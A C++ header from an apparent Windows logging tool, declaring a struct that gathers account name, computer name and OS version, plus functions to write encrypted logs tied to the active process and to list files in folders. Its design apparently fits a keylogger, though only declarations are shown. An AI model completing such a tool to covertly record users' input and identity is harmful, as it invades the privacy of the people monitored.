#ifndef BLXR__STREAM_H_
#define BLXR__STREAM_H_

#include <filesystem>
#include <fstream>
#include <sstream>
#include <rpc.h>
#include <lmcons.h>

#include "helper.h"
#include "encrypt.h"

struct UserData { // FIXME unresolved external >:(
  OSVERSIONINFOEX osVersionInfo;
  char *accountName;
  char *computerName;
  static uint32_t activeProcess;

  static uint32_t GetActiveProcess() {
	return activeProcess;
  }

} *pUserData;

namespace Stream {
class LogFile {
 public:
  std::ofstream Ofstream;
  std::string Name;
  std::string Path;
  std::string PathFull;

  LogFile(const std::string &path, const std::string &name) : Ofstream(path + name, std::fstream::in),
															  Path(path),
															  Name(name),
															  PathFull(path + name) {}
};

std::string GetPath(const std::string &dir = "");
bool MakeDir(const std::string &path);
bool MakeFile();
bool WriteLog(const std::string &input, unsigned int active, bool blockProcessInfo = false);
void GetAccountInfo(UserData *data);
std::vector<std::filesystem::path> GetAllFilesInFolder(const std::string &firstFile);

static Stream::LogFile *logFile;
}

#endif //BLXR__STREAM_H_
